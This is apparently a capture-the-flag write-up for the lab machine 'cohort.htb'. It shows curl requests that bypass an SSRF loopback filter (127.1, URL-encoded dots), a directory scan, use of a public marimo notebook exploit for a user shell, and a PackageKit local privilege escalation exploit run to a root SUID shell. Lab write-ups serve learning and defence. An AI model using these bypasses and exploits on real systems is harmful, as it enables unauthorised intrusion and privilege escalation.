#### foot hold
after some enumerations, I got a apt dir.

`└─$ curl -k -X POST https://cohort.htb/api/validate -H "Content-Type: application/json" -d '{ "url" : "http://127.0.0.1"}'`
```
{"ok": false, "message": "Internal or loopback addresses are not permitted."}  
```
This is SSRF, bypass by some methods.

`└─$ curl -k -X POST https://cohort.htb/api/validate -H "Content-Type: application/json" -d '{ "url" : "http://127.1"}'    
```
{"ok": true, "fetched_status": 200, "content_type": "text/html", "preview": "<!doctype html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>Cohort Analytics</title>\n<meta name=\"description\" content=\"Cohort Analytics - retention intelligence for subscription teams.\">\n<link rel=\"stylesheet\" href=\"/assets/styles.css\">\n</head>\n<body>\n<div id=\"app\" data-page=\"home\" aria-busy=\"true\">\n  <div class=\"boot\"><span class=\"boot-mark\" aria-hidden=\"true\"></span><span>Loading Cohort Analytics</span></div>\n</div>\n<noscript>\n  <div style=\"max-width:640px;margin:18vh auto;padding:0 24px;font-family:system-ui,sans-serif;color:#15181d;text-align:center;\">\n    <h1 style=\"font-size:1.4rem;\">JavaScript required</h1>\n    <p style=\"color:#4a5159;\">The Cohort Analytics workspace runs in your browser. Please enable JavaScript to continue.</p>\n  </div>\n</noscript>\n<script src=\"/assets/app.js\" defer></script>\n</body>\n</html>\n", "message": "Source reachable."} 
```

`curl -k -X POST https://cohort.htb/api/validate -H "Content-Type: application/json" -d '{ "url" : "http://0.0.0.0"}'`

`curl -k -X POST https://cohort.htb/api/validate -H "Content-Type: application/json" -d '{ "url" : "http://127%2E0%2E0%2E1"}'`

use status to get more info

`└─$ curl -k -X POST https://cohort.htb/api/validate -H "Content-Type: application/json" -d '{ "url" : "http://127%2E0%2E0%2E1/status"}' `
```
{"ok": true, "fetched_status": 200, "content_type": "application/json", "preview": "{\"service\":\"cohort-edge\",\"status\":\"ok\",\"generated_by\":\"nginx\",\"upstreams\":[{\"name\":\"marketing\",\"host\":\"cohort.htb\",\"root\":\"/var/www/cohort\"},{\"name\":\"insights-api\",\"host\":\"cohort.htb\",\"path\":\"/api/\",\"target\":\"127.0.0.1:5000\"},{\"name\":\"notebooks\",\"host\":\"nb-1be3782a8afd3ad5.cohort.htb\",\"target\":\"127.0.0.1:8888\",\"note\":\"internal analyst workspace, not for external use\"}]}", "message": "Source reachable."} 
```

target\":\"127.0.0.1:5000\"},{\"name\":\"notebooks\",\"host\":\"nb-1be3782a8afd3ad5.cohort.htb


https://nb-1be3782a8afd3ad5.cohort.htb/auth/login
it is running 5000.

marimo

`─$ sudo dirsearch -u https://nb-1be3782a8afd3ad5.cohort.htb`
```
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
Target: https://nb-1be3782a8afd3ad5.cohort.htb/

[15:05:46] Starting: 
[15:06:17] 200 -    6B  - /api/version
[15:06:18] 200 -    1KB - /auth/login
[15:06:32] 200 -   15KB - /favicon.ico
[15:06:35] 200 -   20B  - /health
[15:06:35] 200 -   20B  - /healthz
[15:06:43] 200 -  490B  - /manifest.json
[15:06:53] 401 -   42B  - /public/
[15:06:53] 401 -   42B  - /public/adminer.php
[15:06:53] 401 -   42B  - /public/hot
[15:06:53] 401 -   42B  - /public/system
[15:06:53] 401 -   42B  - /public/storage
```

https://nb-1be3782a8afd3ad5.cohort.htb/api/version 0.20.4

https://github.com/M3PH1569/CVE-2026-39987-POC


`python CVE-2026-39987.py http://target.com:8080 -i`

get a shell of user

#### priv escalate
`arimo@cohort:~$ dpkg -l | grep packagekit`
```
ii  gir1.2-packagekitglib-1.0             1.2.8-2ubuntu1.5                                 amd64        GObject introspection data for the PackageKit GLib library
```
https://github.com/Vozec/CVE-2026-41651

marimo@cohort:~$ ./cve-2026-41651 
═══════════════════════════════════════════════════
 CVE-2026-41651 — PackageKit TOCTOU LPE
═══════════════════════════════════════════════════
[*] Building packages (pure C)...
[+] dummy   : /tmp/.pk-dummy-31470.deb
[+] payload : /tmp/.pk-payload-31470.deb
[*] Transaction : /2_dbceebba
[*] Step 1 : InstallFiles(SIMULATE=0x4, dummy) [async]
[*] Step 2 : InstallFiles(NONE=0x0, payload) [async]
[*] Waiting for dispatch (30 s max)...
[!] PK error 48: Failed to obtain authentication.
[*] Finished (exit=2, 0 ms)
[*] Loop ran for 43 ms
[*] Polling for payload (120 s max)...
[*] t+1s: payload=exists dpkg_lock=free suid=not yet
[*] t+2s: payload=exists dpkg_lock=free suid=not yet

[+] SUCCESS — SUID bash at t+1200ms
uid=1000(marimo) gid=1000(marimo) euid=0(root) groups=1000(marimo)
.suid_bash: cannot set terminal process group (-1): Inappropriate ioctl for device
.suid_bash: no job control in this shell

.suid_bash-5.2# id
uid=1000(marimo) gid=1000(marimo) euid=0(root) groups=1000(marimo)

#### lesson learned
- SSRF, bypass string filter method.
- dpkg -l | grep packagekit, with vuln.
